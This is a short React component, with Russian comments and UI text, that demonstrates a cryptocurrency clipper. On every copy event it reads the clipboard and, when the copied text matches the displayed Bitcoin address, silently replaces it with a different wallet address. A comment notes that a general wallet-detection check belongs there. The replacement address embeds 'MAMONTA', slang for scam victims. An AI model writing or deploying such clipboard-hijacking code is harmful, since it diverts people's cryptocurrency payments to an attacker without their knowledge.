import { useEffect, useState } from 'react';
import './App.css';

const address = `1EKC6kqp3tmeHr9YNvmXV9smZ6FiRct8ZQ`;

function App() {
  const [text, setText] = useState('');
  useEffect(() => {
    async function clipper() {
      const text = await navigator.clipboard.readText();

      // здесь должна быть проверка на то что это криптокошелёк
      if (text === address) {
        await navigator.clipboard.writeText('18KQzrpXT9ty4o4phPjSKAM17MAMONTAhv3qnabURYhX1');
      }
    }

    document.addEventListener('copy', clipper);

    return () => document.removeEventListener('copy', clipper);
  }, []);

  return (
    <div>
      <h3>Здесь ваш криптокошелёк, попробуйте скопировать</h3>
      <p>{address}</p>
      <textarea className="textarea" onChange={(e) => setText(e.target.value)} name="" id="" value={text} />
    </div>
  );
}

export default App;
